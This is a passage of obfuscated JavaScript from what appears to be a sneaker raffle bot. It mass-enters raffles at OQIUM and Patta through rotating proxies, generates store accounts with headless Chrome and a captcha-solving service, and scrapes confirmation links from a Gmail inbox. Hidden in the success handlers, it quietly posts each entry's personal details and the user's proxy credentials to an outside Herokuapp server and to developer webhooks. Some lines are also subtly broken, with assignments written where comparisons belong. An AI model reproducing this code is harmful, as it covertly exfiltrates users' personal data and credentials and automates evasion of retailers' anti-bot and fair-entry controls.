                                                'value': '' + _0x492c9c
                                            }
                                        ]
                                    }], _0x35496e = { 'embeds': _0x259844 }, _0x3b6986 = _0x3aedf2['data'], _0x3b6986['data']['attributes']['email'] = '' + _0x45b936[_0x318214]['Email'];
                                    if (_0x45b936[_0x318214]['Size'] == 'RANDOM') {
                                    }
                                    _0x3b6986['data']['attributes']['properties']['$first_name'] = '' + _0x45b936[_0x318214]['FirstName'], _0x3b6986['data']['attributes']['properties']['$last_name'] = '' + _0x45b936[_0x318214]['LastName'], _0x3b6986['data']['attributes']['properties']['$address1'] = _0x45b936[_0x318214]['Address1'] + '\x20' + _0x45b936[_0x318214]['Address2'] + '\x20' + _0x45b936[_0x318214]['HouseNumber'], _0x3b6986['data']['attributes']['properties']['$zip'] = '' + _0x45b936[_0x318214]['Zip'], _0x3b6986['data']['attributes']['properties']['$city'] = '' + _0x45b936[_0x318214]['City'], _0x3b6986['data']['attributes']['properties']['$country'] = '' + _0x45b936[_0x318214]['Country'], _0x45b936[_0x318214]['Size'] == 'RANDOM' ? _0x3b6986['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x27456d[_0x303a37] : _0x3b6986['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x45b936[_0x318214]['Size'], _0x3b6986['data']['attributes']['properties']['$phone_number'] = '' + _0x45b936[_0x318214]['Phone'], _0x3b6986['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x45b936[_0x318214]['Follower'];
                                }
                                if (_0x79d23a['useRandomProxy'] = ![])
                                    var _0x1afb95 = _0x585c6d[_0x318214]['split'](':');
                                else
                                    var _0xca0bbe = Math['round'](Math['random']() * (_0x585c6d['length'] - 0x1)), _0x1afb95 = _0x585c6d[_0xca0bbe]['split'](':');
                                var _0x1e83ad = {
                                    'jar': _0x426561,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3aedf2['url'],
                                    'headers': _0x3aedf2['headers'],
                                    'body': JSON['stringify'](_0x3b6986),
                                    'proxy': 'http://' + _0x1afb95[0x2] + ':' + _0x1afb95[0x3] + '@' + _0x1afb95[0x0] + ':' + _0x1afb95[0x1]
                                };
                                return _0x2e8b70 != 'ver' && (_0x1e83ad['url'] = _0x3aedf2['url'], _0x1e83ad['headers'] = _0x3aedf2['headers']), _0x2e8b70 == 'ver' && (_0x1e83ad['method'] = 'GET'), new Promise(function (_0x5f1708, _0x1fe204) {
                                    callback = async (_0x44f45a, _0x4eed72, _0x145bb0) => {
                                        if (!_0x44f45a && _0x4eed72['statusCode'] == 0xca || !_0x44f45a && _0x4eed72['statusCode'] == 0xc8) {
                                            if (_0x2e8b70 != 'ver') {
                                                var _0x18f386 = await _0x117512(_0x45b936[_0x318214], _0x3aedf2, 'dev', ![]), _0x3ec4bd = await _0x117512(_0x45b936[_0x318214], _0x3aedf2, 'pub', ![]);
                                                const _0x4560f8 = {
                                                    'succesDEVMSG': { 'embeds': [_0x18f386] },
                                                    'succesPUBMSG': { 'embeds': [_0x3ec4bd] }
                                                };
                                                let _0x47eb81 = _0x45b936[_0x318214];
                                                try {
                                                    prxdata = {
                                                        'username': _0x2e53d0['replace']('#', ''),
                                                        'module': _0x3aedf2['name'],
                                                        'entrydata': JSON['stringify'](_0x47eb81),
                                                        'proxy': '' + _0x585c6d[_0x318214]
                                                    };
                                                    var _0x46633e = JSON['stringify'](prxdata);
                                                    let _0x50eec2 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x46633e, _0x50eec2);
                                                } catch (_0x1292e3) {
                                                }
                                                if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                                                    try {
                                                        await _0x15c654(_0x79d23a['webhook'], _0x4560f8['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x4560f8['succesDEVMSG']), await _0x289b0b(0xc8);
                                                try {
                                                    await _0x15c654(_0x1d7baa, _0x4560f8['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x53c50d(_0x45b936[_0x318214], _0x3aedf2);
                                            }
                                            _0x33e3ee--, _0x5f1708(console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x3aedf2['name'] + ']\x20Task\x20' + (_0x318214 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2e8b70 != 'ver') {
                                                var _0x3dff61 = '' + _0x44f45a, _0x13d245 = await _0x117512(_0x45b936[_0x318214], _0x3aedf2, 'dev', !![], _0x3dff61), _0x4428b7 = {};
                                                _0x4428b7['errorDEV'] = { 'embeds': [_0x13d245] }, _0x5f4429(_0x45b936[_0x318214], _0x3aedf2), _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4428b7['errorDEV']), await _0x15c654(_0x34ab86, _0x4428b7['errorDEV']);
                                            }
                                            _0x33e3ee--, _0x1fe204(console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x3aedf2['name'] + ']\x20Task\x20' + (_0x318214 + 0x1) + ':\x20' + _0x44f45a)));
                                        }
                                    };
                                    try {
                                        _0x2e8b70 != 'ver' && console['log'](_0x3d201d() + '\x20[' + _0x3aedf2['name'] + ']\x20Task\x20' + (_0x318214 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3b6986['data']['attributes']['email']), _0x2a2e1d(_0x1e83ad, callback);
                                    } catch (_0xa0bcf9) {
                                        console['log'](_0x3d201d() + '\x20Task\x20' + (_0x318214 + 0x1) + ':\x20' + _0xa0bcf9);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x32c3c4(_0x515f0d, 'nor', _0x10f881, _0x4ad348, _0x1d32eb), console['log'](_0x3d201d() + '\x20[' + _0x10f881['name'] + ']\x20Sleeping\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                            } catch (_0x1df14b) {
                            }
                        }
                        _0x336f5b(_0x4f2647, _0x2c1a98, _0x445a85, _0x444684), await _0x289b0b(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4ba1ff, _0x33d052, _0x415d97) {
                    var _0x33d052 = [], _0x44f339 = ![];
                    async function _0x56a598() {
                        var _0x14e1a2 = new _0x517e1b({
                            'user': _0x79d23a['masterMail'],
                            'password': _0x79d23a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1f2011(_0x599d9d) {
                            _0x14e1a2['openBox']('INBOX', ![], _0x599d9d);
                        }
                        _0x14e1a2['once']('ready', function () {
                            _0x1f2011(function (_0x515fd7, _0x54ce74) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x515fd7)
                                    throw _0x515fd7;
                                _0x14e1a2['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x7ff801, _0x5d1bcf) {
                                    if (!_0x5d1bcf || !_0x5d1bcf['length'])
                                        console['log'](_0x3d201d() + '\x20[' + _0x4ba1ff['name'] + ']\x20No\x20mails\x20found'), _0x14e1a2['end']();
                                    else {
                                        var _0x56961b = _0x14e1a2['seq']['fetch'](_0x5d1bcf, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x56961b['on']('message', function (_0x4243c8, _0x154063) {
                                            var _0x48db8e = '(#' + _0x154063 + ')\x20';
                                            _0x4243c8['on']('body', function (_0x2e5ded, _0x2aa141) {
                                                _0xa13a33(_0x2e5ded, (_0x12d302, _0x291b71) => {
                                                    var _0x22453c = _0x291b71['text']['split']('(')[0x1], _0x135041 = _0x22453c['split'](')')[0x0];
                                                    _0x33d052['push'](_0x135041);
                                                });
                                            }), _0x4243c8['once']('end', function () {
                                            });
                                        }), _0x56961b['once']('error', function (_0xe5b856) {
                                            console['log']('Fetch\x20error:\x20' + _0xe5b856), _0x44f339 = !![];
                                        }), _0x56961b['once']('end', function () {
                                            _0x14e1a2['end'](), _0x44f339 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x14e1a2['once']('error', function (_0x2e5fad) {
                            console['log'](_0x2e5fad), _0x44f339 = !![];
                        }), _0x14e1a2['once']('end', async function () {
                            _0x44f339 = !![];
                        }), _0x14e1a2['connect']();
                    }
                    async function _0x6eaa76(_0x193b31, _0x43e161, _0x38143c) {
                        for (var _0xc7afef = 0x0; _0xc7afef < _0x43e161['length']; _0xc7afef++) {
                            async function _0x477f6f(_0x150ffc, _0x6cfb9a, _0x486fbe, _0x523d3c, _0x2cd01e) {
                                var _0x22b7f7, _0x40b70e = {}, _0x248cca = [], _0x50fa3b = {}, _0x4c0f67 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x374059 = Math['round'](Math['random']() * (_0x4c0f67['length'] - 0x1));
                                _0x523d3c[_0x150ffc]['Size'] == 'RANDOM' && (_0x523d3c[_0x150ffc]['Size'] = _0x4c0f67[_0x374059]);
                                !_0x523d3c && (_0x523d3c = {});
                                if (_0x79d23a['useRandomProxy'] = ![])
                                    var _0x4cb3be = _0x2cd01e[_0x150ffc]['split'](':');
                                else
                                    var _0x72863b = Math['round'](Math['random']() * (_0x2cd01e['length'] - 0x1)), _0x4cb3be = _0x2cd01e[_0x72863b]['split'](':');
                                var _0x2e5fc9 = {
                                    'jar': _0x426561,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x486fbe['url'],
                                    'headers': _0x486fbe['headers'],
                                    'body': JSON['stringify'](_0x40b70e),
                                    'proxy': 'http://' + _0x4cb3be[0x2] + ':' + _0x4cb3be[0x3] + '@' + _0x4cb3be[0x0] + ':' + _0x4cb3be[0x1]
                                };
                                return _0x6cfb9a == 'ver' && (_0x2e5fc9['method'] = 'GET', _0x2e5fc9['url'] = _0x523d3c[_0x150ffc]), new Promise(function (_0x38ea3e, _0x4f4aaa) {
                                    callback = async (_0x36584e, _0x43f039, _0x283d25) => {
                                        !_0x36584e && _0x43f039['statusCode'] == 0xca || !_0x36584e && _0x43f039['statusCode'] == 0xc8 ? _0x38ea3e(console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x486fbe['name'] + ']\x20Task\x20' + (_0x150ffc + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x4f4aaa(console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x486fbe['name'] + ']\x20Task\x20' + (_0x150ffc + 0x1) + ':\x20' + _0x36584e)));
                                    };
                                    try {
                                        _0x6cfb9a != 'ver' ? console['log'](_0x3d201d() + '\x20[' + _0x486fbe['name'] + ']\x20Task\x20' + (_0x150ffc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x40b70e['data']['attributes']['email']) : console['log'](_0x3d201d() + '\x20[' + _0x486fbe['name'] + ']\x20Task\x20' + (_0x150ffc + 0x1) + ':\x20Fetching\x20Response'), _0x2a2e1d(_0x2e5fc9, callback);
                                    } catch (_0x375f14) {
                                        console['log'](_0x3d201d() + '\x20Task\x20' + (_0x150ffc + 0x1) + ':\x20' + _0x375f14);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x477f6f(_0xc7afef, 'ver', _0x193b31, _0x43e161, _0x38143c), console['log'](_0x3d201d() + '\x20[' + _0x193b31['name'] + ']\x20Sleeping\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                            } catch (_0x4a5b0c) {
                                console['log'](_0x4a5b0c), await _0x289b0b(0x2710);
                            }
                        }
                    }
                    try {
                        _0x56a598();
                        while (!_0x44f339) {
                            await _0x289b0b(0xfa0);
                        }
                        console['log']('Found\x20' + _0x33d052['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x2829c9) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x2829c9), await _0x289b0b(0x2710);
                    }
                    try {
                        await _0x6eaa76(_0x4ba1ff, _0x33d052, _0x415d97);
                    } catch (_0x292ab5) {
                        console['log'](_0x292ab5), await _0x289b0b(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2049a8, _0x8375f4, _0x338a1a) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46958d = 0x0; _0x46958d < _0x8375f4['length']; _0x46958d++) {
                        var _0x325971 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2e53d0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x79d23a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x492c9c
                                }
                            ]
                        }];
                        const _0x29bbc9 = { 'embeds': _0x325971 };
                        _0x25b0b6(_0x2049a8['name'] + '\x20Task\x20' + (_0x46958d + 0x1) + '\x20/\x20' + _0x8375f4['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        try {
                            await _0x5af4d5(_0x8375f4, _0x46958d);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3f577e = await _0x117512(_0x8375f4[_0x46958d], _0x2049a8, 'acc', ![]);
                        const _0x503efb = { 'succesDEVMSG': { 'embeds': [_0x3f577e] } };
                        if (_0x8375f4[_0x46958d]['Email'] == '' || _0x8375f4[_0x46958d]['FirstName'] == '' || _0x8375f4[_0x46958d]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x289b0b(0x7d0);
                            continue;
                        }
                        (_0x8375f4[_0x46958d]['Password'] == '' || _0x8375f4[_0x46958d] == undefined) && _0x8375f4[_0x46958d]['Password'] == 'JRaffles23!';
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x424261 = _0x338a1a[_0x46958d]['split'](':');
                        else
                            var _0xfbbc42 = Math['round'](Math['random']() * (_0x338a1a['length'] - 0x1)), _0x424261 = _0x338a1a[_0xfbbc42]['split'](':');
                        var _0x5d933b;
                        try {
                            _0x5d933b = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x424261[0x0] + ':' + _0x424261[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5d933b = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x424261[0x0] + ':' + _0x424261[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4fa7c7 = await _0x5d933b['newPage']();
                            await _0x4fa7c7['authenticate']({
                                'username': '' + _0x424261[0x2],
                                'password': '' + _0x424261[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x2049a8['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fa7c7['setRequestInterception'](!![]), _0x4fa7c7['on']('request', _0x153178 => {
                                _0x153178['resourceType']() === 'image' || _0x153178['resourceType']() === 'font' || _0x153178['resourceType']() === 'media' ? _0x153178['abort']() : _0x153178['continue']();
                            }), await _0x4fa7c7['goto']('https://patta.nl/account/register'), await _0x289b0b(0xbb8), await _0x4fa7c7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3d201d() + '\x20[' + _0x2049a8['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Filling\x20information'), await _0x4fa7c7['type']('#RegisterForm-FirstName', '' + _0x8375f4[_0x46958d]['FirstName']), await _0x289b0b(0x226), await _0x4fa7c7['type']('#RegisterForm-LastName', '' + _0x8375f4[_0x46958d]['LastName']), await _0x289b0b(0x226), await _0x4fa7c7['type']('#RegisterForm-email', '' + _0x8375f4[_0x46958d]['Email']), await _0x289b0b(0x226), await _0x4fa7c7['type']('#RegisterForm-password', '' + _0x8375f4[_0x46958d]['Password']), await _0x289b0b(0x226), console['log'](_0x3d201d() + '\x20[' + _0x2049a8['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Submitting..'), await _0x4fa7c7['$eval']('#RegisterForm', _0x348d56 => _0x348d56['submit']()), await _0x289b0b(0x1f40);
                            try {
                                await _0x4fa7c7['waitForSelector']('.home-page-grid__collection'), await _0x289b0b(0x1f4), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x2049a8['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Account\x20' + _0x8375f4[_0x46958d]['Email'] + '\x20Generated!')), _0x457b0a['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x8375f4[_0x46958d]['Email'] + ',' + _0x8375f4[_0x46958d]['Password']), console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x2049a8['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Account\x20' + _0x8375f4[_0x46958d]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x503efb['succesDEVMSG']);
                                } catch {
                                }
                                await _0x15c654(_0x534fd1, _0x503efb['succesDEVMSG']);
                            } catch (_0x16096b) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x16096b));
                            }
                        } catch (_0x1a3d99) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46958d + 0x1) + '\x20:\x20' + _0x1a3d99));
                        } finally {
                            _0x5d933b && _0x5d933b['close'](), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3a90e1, _0x3edb8d, _0x5d0d28) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x390c84 = 0x0; _0x390c84 < _0x3edb8d['length']; _0x390c84++) {
                        var _0x7ca5dd;
                        if (_0x1ce411 != 'yes')
                            var _0x1ce411 = '', _0x12040c = 0x0;
                        _0x25b0b6(_0x3a90e1['name'] + '\x20Task\x20' + (_0x390c84 + 0x1) + '\x20/\x20' + _0x3edb8d['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        try {
                            await _0x5af4d5(_0x3edb8d, _0x390c84);
                        } catch {
                            _0x1ce411 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3edb8d[_0x390c84]['Email'] == '' || _0x3edb8d[_0x390c84]['Password'] == '' || _0x3edb8d[_0x390c84]['FirstName'] == '' || _0x3edb8d[_0x390c84]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x2f1e39 = _0x5d0d28[_0x390c84]['split'](':');
                        else
                            var _0x4a15b6 = Math['round'](Math['random']() * (_0x5d0d28['length'] - 0x1)), _0x2f1e39 = _0x5d0d28[_0x4a15b6]['split'](':');
                        var _0x4e6d34;
                        try {
                            _0x4e6d34 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2f1e39[0x0] + ':' + _0x2f1e39[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4e6d34 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2f1e39[0x0] + ':' + _0x2f1e39[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a5461 = await _0x4e6d34['newPage']();
                            await _0x5a5461['authenticate']({
                                'username': '' + _0x2f1e39[0x2],
                                'password': '' + _0x2f1e39[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a5461['setRequestInterception'](!![]), _0x5a5461['on']('request', _0x4f7f2d => {
                                _0x4f7f2d['resourceType']() === 'image' || _0x4f7f2d['resourceType']() === 'font' || _0x4f7f2d['resourceType']() === 'media' ? _0x4f7f2d['abort']() : _0x4f7f2d['continue']();
                            }), await _0x5a5461['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5a5461['waitForSelector']('#CustomerEmail'), console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5a5461['type']('#CustomerEmail', '' + _0x3edb8d[_0x390c84]['Email']), await _0x289b0b(0x12c), await _0x5a5461['type']('#CustomerPassword', '' + _0x3edb8d[_0x390c84]['Password']), await _0x289b0b(0x226), await _0x5a5461['$eval']('#customer_login', _0x48d92b => _0x48d92b['submit']());
                            try {
                                await _0x5a5461['waitForSelector']('#orders'), await _0x289b0b(0x4b0);
                            } catch {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5a5461['goto']('' + _0x3edb8d[_0x390c84]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x289b0b(0xbb8), console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5a5461['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x5a5461['type']('#email', '' + _0x3edb8d[_0x390c84]['Email']), await _0x289b0b(0x384), await _0x5a5461['type']('#first_name', '' + _0x3edb8d[_0x390c84]['FirstName']), await _0x289b0b(0x514), await _0x5a5461['type']('#last_name', '' + _0x3edb8d[_0x390c84]['LastName']), await _0x289b0b(0x514), await _0x5a5461['type']('#street_address', _0x3edb8d[_0x390c84]['Address1'] + '\x20' + _0x3edb8d[_0x390c84]['HouseNumber'] + '\x20' + _0x3edb8d[_0x390c84]['Address2']), await _0x289b0b(0x2bc);
                            _0x3edb8d[_0x390c84]['Postcode'] == undefined && (_0x3edb8d[_0x390c84]['Postcode'] = _0x3edb8d[_0x390c84]['Zip']);
                            await _0x5a5461['type']('#zip_code', '' + _0x3edb8d[_0x390c84]['Postcode']), await _0x289b0b(0x320), await _0x5a5461['type']('#city', '' + _0x3edb8d[_0x390c84]['City']), await _0x289b0b(0x320), await _0x5a5461['type']('#bday', '01/01/1994'), await _0x289b0b(0x320), await _0x5a5461['type']('#instagram', '' + _0x3edb8d[_0x390c84]['Follower']), await _0x289b0b(0x352);
                            if (_0x3edb8d[_0x390c84]['Size'] == 'RANDOM') {
                                const _0x464830 = await _0x5a5461['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x16b980 => {
                                    return _0x16b980['map'](_0x525c0f => _0x525c0f['textContent']);
                                });
                                var _0x14435c = Math['round'](Math['random']() * (_0x464830['length'] - 0x1));
                                console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x464830[_0x14435c]), await _0x5a5461['click']('label[data-eu-size=\x22' + _0x464830[_0x14435c] + '\x22]');
                            } else {
                                console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3edb8d[_0x390c84]['Size']);
                                try {
                                    await _0x5a5461['click']('label[data-eu-size=\x22' + _0x3edb8d[_0x390c84]['Size'] + '\x22]');
                                } catch {
                                    await _0x5a5461['click']('label[data-eu-size=\x22' + _0x3edb8d[_0x390c84]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x289b0b(0xbb8), await _0x5a5461['$$eval']('.raffle__checkbox-label', _0x249cee => _0x249cee['forEach'](_0x3bc639 => _0x3bc639['click']())), await _0x289b0b(0x7d0), console['log'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x5a5461['click']('#raffle__form-submit'), await _0x289b0b(0x1388);
                            try {
                                await _0x5a5461['waitForSelector']('#raffle__confirmation-message-container'), _0x1ce411 = 'no', _0x53c50d(_0x3edb8d[_0x390c84], _0x3a90e1), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x3357f0 = _0x3edb8d[_0x390c84];
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'module': _0x3a90e1['name'],
                                        'entrydata': JSON['stringify'](_0x3357f0),
                                        'proxy': '' + _0x5d0d28[_0x390c84]
                                    };
                                    var _0x4566f1 = JSON['stringify'](prxdata);
                                    let _0x2c45f2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x4566f1, _0x2c45f2);
                                } catch (_0x2d0e6b) {
                                }
                            } catch (_0x24ea9a) {
